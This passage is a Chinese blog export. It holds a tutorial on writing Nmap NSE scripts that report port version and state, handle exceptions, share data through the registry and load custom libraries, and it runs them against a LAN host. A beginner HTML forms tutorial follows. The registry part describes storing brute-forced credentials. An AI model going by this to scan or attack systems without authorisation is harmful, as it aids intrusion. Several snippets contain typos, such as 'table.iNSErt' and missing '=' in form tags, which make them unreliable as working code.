<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return port.version</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.31.21 -sV</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200611074343321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5. port.state字段<br>存放端口的状态<br>咧<br>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">	return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">	return port.state</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.31.21</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200611074652210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="NSE中的异常处理"><a href="#NSE中的异常处理" class="headerlink" title="NSE中的异常处理"></a>NSE中的异常处理</h2><p>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local nmap &#x3D; require &quot;nmap&quot;</span><br><span class="line">local comm &#x3D; require &quot;comm&quot;</span><br><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default,discovery,safe&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; shortport.port_or_service(79, &quot;ﬁnger&quot;)</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line">try &#x3D; nmap.new_try()</span><br><span class="line">return try(comm.exchange(host, port, &quot;\r\n&quot;, </span><br><span class="line">&#123;lines&#x3D;100, timeout&#x3D;5000&#125;))</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>上面代码说明<br>nmap提供了nmap库，叫nmap<br>监控异常的代码放置在Nmap.new_try()函数的括号中即可，这个函数的第一个返回值就表明了状态。如果返回值为false或者nil，第二个返回值就是一个错误相关的字符串<br>如果comm.exchange正常执行的话，就可以返回原本的值，如果出现异常，就可以返回这个异常</p>
<h2 id="NSE中的注册表"><a href="#NSE中的注册表" class="headerlink" title="NSE中的注册表"></a>NSE中的注册表</h2><p>NSE注册表也是一个Lua<br>tablc 类型的数据文件，他主要用来保持住一次扫描中各个脚本之间共享的变量，这个注册表保持住一个名为nmap.refistry的变量中。举个例子，在使用脚本对目标的口令进行爆破的时候，就可以使用这个注册表把已经破解的用户密码保持起来，已提供其他脚本的使用。例如，爆破得到目标的用户admin，密码123456,就会执行一个插入操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">table.iNSErt(Nmap.registry.credentials.http, </span><br><span class="line">&#123; username &#x3D; admin, password &#x3D;123456 &#125; )</span><br></pre></td></tr></table></figure>
<h2 id="NSE中的库文件"><a href="#NSE中的库文件" class="headerlink" title="NSE中的库文件"></a>NSE中的库文件</h2><ol>
<li>库文件的位置</li>
</ol>
<p>库文件在<code>/usr/share/nmap/nselib</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020061110090232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>halcyon编辑器会自动按照nmap的路径进行找到库<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200611100529723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这些库文件涵盖了几乎当前所有的流行协议、常见的字符串处理操作，甚至包含了用来实现对用户名和密码进行破解的brute库文件。当在编写NSE脚本的时候，你可能会考虑到代码重构的问题。最好的解决方法还是将核心的代码创建为NSE的库文件。事实上，NSE库文件的创建是非常简单的。NSE中的库文件大都是使用Lua语言编写的，但是如果你使用C或者C++语言也是可行的</p>
<h3 id="NSE库文件编写和调用"><a href="#NSE库文件编写和调用" class="headerlink" title="NSE库文件编写和调用"></a>NSE库文件编写和调用</h3><ol>
<li>NSE库文件编写<br>咧<br>代码</li>
</ol>
<p>保存的文件名<code>a.lua</code>保持到<code>/usr/share/nmap/nselib</code>目录里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function b(port)         </span><br><span class="line">        return string.format(&quot;The port &#39;%s&#39; is open&quot;,port)      </span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>代码说明<br>function 定义函数的，定义了一个a函数传参是port<br>string.format函数是一个类似printf的格式化字符串我看到了一个写的很详细的在这个地址<a href="https://blog.csdn.net/hello_crayon/article/details/50667927">https://blog.csdn.net/hello_crayon/article/details/50667927</a><br>2. 调用<br>NSE脚本调用<br>编写一个NSE脚本<br>代码<br>保持的文件名为<code>wode.nse</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local shortport &#x3D; require &quot;shortport&quot;</span><br><span class="line">local a &#x3D; require &quot;a&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">description &#x3D; [[]]</span><br><span class="line"></span><br><span class="line">author &#x3D; &quot;root&quot;</span><br><span class="line"></span><br><span class="line">license &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;</span><br><span class="line"></span><br><span class="line">categories &#x3D; &#123;&quot;default&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">portrule &#x3D; function(host, port)</span><br><span class="line">        return true</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">action &#x3D; function(host, port)</span><br><span class="line"></span><br><span class="line">        return b(port.number)</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>代码调用说明<br><strong>上面的代码<code>local a = require &quot;a&quot;</code>就是调用上面编写的a.lua的脚本文件<br>上面的代码 <code>return b(port.number)</code>代码就是b就是a.lua的脚本文件里面的函数，port.number传参给a.lua的脚本文件文件里面的port</strong></p>
<p> 叫<code>wode.nse</code>移动到<code>/usr/share/nmap/scripts/</code>文件下面<br>复制进去要更新一下nmap脚本的数据库<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script-updatedb</span><br></pre></td></tr></table></figure>
<p>结果<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap --script wode 192.168.31.21</span><br></pre></td></tr></table></figure>
<p>  <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200611112628243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>nmap</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML表单</title>
    <url>/2020/11/26/HTML%E8%A1%A8%E5%8D%95/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>下面是光介绍HTML的，没有交换过程</p>
<p>常见的表单的标签</p>
<table>
<thead>
<tr>
<th align="center">标签</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>&lt;form&gt;</code></td>
<td align="right">定义表单</td>
</tr>
<tr>
<td align="center"><code>&lt;input&gt;</code></td>
<td align="right">输入区域</td>
</tr>
<tr>
<td align="center"><code>&lt;select&gt;</code></td>
<td align="right">选项组</td>
</tr>
<tr>
<td align="center"><code>&lt;option&gt;</code></td>
<td align="right">下拉列表中的选项在<code>&lt;select&gt;</code> 选项组里面</td>
</tr>
<tr>
<td align="center"><code>&lt;textarea&gt;</code></td>
<td align="right">文本域</td>
</tr>
<tr>
<td align="center"><code>&lt;legend&gt;</code></td>
<td align="right">域标题</td>
</tr>
</tbody></table>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125112003.png"></p>
<h2 id="lt-form-gt-标签"><a href="#lt-form-gt-标签" class="headerlink" title="&lt;form&gt;标签"></a><code>&lt;form&gt;</code>标签</h2><table>
<thead>
<tr>
<th align="center">常见的属性</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>action</code></td>
<td align="right">指定叫表单提交那</td>
</tr>
<tr>
<td align="center"><code>method</code></td>
<td align="right">的 HTTP 方法比如<code>get</code> <code>post</code></td>
</tr>
<tr>
<td align="center"><code>target</code></td>
<td align="right">提交后在新窗口中打开</td>
</tr>
</tbody></table>
<h3 id="表单定义"><a href="#表单定义" class="headerlink" title="表单定义"></a>表单定义</h3><p><code>&lt;form&gt;</code> 定义表单<br>表单是一个包含表单元素的区域</p>
<h3 id="action属性指定叫表单提交那"><a href="#action属性指定叫表单提交那" class="headerlink" title="action属性指定叫表单提交那"></a>action属性指定叫表单提交那</h3><p>用<code>action</code>属性指定发往那去<br>下面这样是提交到当前页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>&quot;#&quot;&gt;</span></span><br><span class="line">    .......</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>下面是提交到a.php里面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>&quot;<span class="attr">a.php</span>&quot;&gt;</span></span><br><span class="line">    .......</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="method属性指定get或post"><a href="#method属性指定get或post" class="headerlink" title="method属性指定get或post"></a>method属性指定get或post</h3><p>下面提交的时候指定的是<code>get</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>&quot;<span class="attr">a.php</span>&quot; <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">    .......</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="target属性添加在另外一个窗口打开"><a href="#target属性添加在另外一个窗口打开" class="headerlink" title="target属性添加在另外一个窗口打开"></a>target属性添加在另外一个窗口打开</h3><p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                                <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>  /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201126091210.png"></p>
<h2 id="lt-input-gt-标签常见的属性"><a href="#lt-input-gt-标签常见的属性" class="headerlink" title="&lt;input&gt;标签常见的属性"></a><code>&lt;input&gt;</code>标签常见的属性</h2><p>常见的属性</p>
<table>
<thead>
<tr>
<th align="center">常见的属性</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>type</code></td>
<td align="right">创建单行文本输入框</td>
</tr>
<tr>
<td align="center"><code>name</code></td>
<td align="right">当前input起个名字，用作表单参数</td>
</tr>
<tr>
<td align="center"><code>value</code></td>
<td align="right">定义input元素的默认值</td>
</tr>
<tr>
<td align="center"><code>maxlength</code></td>
<td align="right">规定input元素可输入最长字符数</td>
</tr>
<tr>
<td align="center"><code>width</code></td>
<td align="right">下拉列表中的选项在<code>&lt;select&gt;</code> 选项组里面</td>
</tr>
<tr>
<td align="center"><code>width</code></td>
<td align="right">宽度</td>
</tr>
<tr>
<td align="center"><code>height</code></td>
<td align="right">高度</td>
</tr>
</tbody></table>
<h2 id="lt-input-gt-标签的type属性"><a href="#lt-input-gt-标签的type属性" class="headerlink" title="&lt;input&gt;标签的type属性"></a><code>&lt;input&gt;</code>标签的type属性</h2><p>应为type属性很重要我下面就介绍一下type属性</p>
<table>
<thead>
<tr>
<th align="center">type值</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>button</code></td>
<td align="right">按钮</td>
</tr>
<tr>
<td align="center"><code>submit</code></td>
<td align="right">提交按钮</td>
</tr>
<tr>
<td align="center"><code>text</code></td>
<td align="right">输入框</td>
</tr>
<tr>
<td align="center"><code>file</code></td>
<td align="right">文件上传</td>
</tr>
<tr>
<td align="center"><code>password</code></td>
<td align="right">密码输入框</td>
</tr>
<tr>
<td align="center"><code>hidden</code></td>
<td align="right">定义隐藏的输入字段</td>
</tr>
<tr>
<td align="center"><code>image</code></td>
<td align="right">定义图像形式的提交按钮</td>
</tr>
<tr>
<td align="center"><code>checkbox</code></td>
<td align="right">定义复选框</td>
</tr>
<tr>
<td align="center"><code>radio</code></td>
<td align="right">单选框</td>
</tr>
<tr>
<td align="center"><code>reset</code></td>
<td align="right">重置</td>
</tr>
<tr>
<td align="center"><code>tel</code></td>
<td align="right">手机号码</td>
</tr>
<tr>
<td align="center"><code>email</code></td>
<td align="right">邮箱地址</td>
</tr>
<tr>
<td align="center"><code>number</code></td>
<td align="right">数字</td>
</tr>
<tr>
<td align="center"><code>date</code></td>
<td align="right">日期</td>
</tr>
</tbody></table>
<h3 id="下面我就演示几个"><a href="#下面我就演示几个" class="headerlink" title="下面我就演示几个"></a>下面我就演示几个</h3><h4 id="“button”-按钮"><a href="#“button”-按钮" class="headerlink" title="“button”  | 按钮"></a>“button”  | 按钮</h4><p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125162706.png"><br>上面的结果可以看见他里面没有任何字我们可以用<code>value</code>属性来添加字<br>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125163003.png"></p>
<h4 id="“submit”-提交按钮"><a href="#“submit”-提交按钮" class="headerlink" title="“submit” 提交按钮"></a>“submit” 提交按钮</h4><p>他也可以用value来修改提交的那个字<br>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>  &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125163403.png"></p>
<h4 id="“radio”-单选框"><a href="#“radio”-单选框" class="headerlink" title="“radio”  单选框"></a>“radio”  单选框</h4><p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125154521.png"></p>
<h4 id="“checkbox”-定义复选框"><a href="#“checkbox”-定义复选框" class="headerlink" title="“checkbox”  定义复选框"></a>“checkbox”  定义复选框</h4><p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125154727.png"></p>
<h4 id="“text”-文本"><a href="#“text”-文本" class="headerlink" title="“text” 文本"></a>“text” 文本</h4><p>text    定义单行的输入字段，用户可在其中输入文本。默认宽度为 20 个字符。<br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125152742.png"></p>
<h4 id="“file”-文件"><a href="#“file”-文件" class="headerlink" title="“file”  文件"></a>“file”  文件</h4><p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125153849.png"></p>
<h4 id="“date”-日期"><a href="#“date”-日期" class="headerlink" title="“date”  日期"></a>“date”  日期</h4><p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125154000.png"></p>
<h2 id="lt-input-gt-标签的name属性"><a href="#lt-input-gt-标签的name属性" class="headerlink" title="&lt;input&gt;标签的name属性"></a><code>&lt;input&gt;</code>标签的name属性</h2><p>name 属性规定 input 元素的名称<br>简单来说就是提交的时候知道是那个参数提交的他就是定义猜数名的<br>比如提交一个用户名后端是怎么知道是那个输入框的内容就用<code>name</code>来指定名</p>
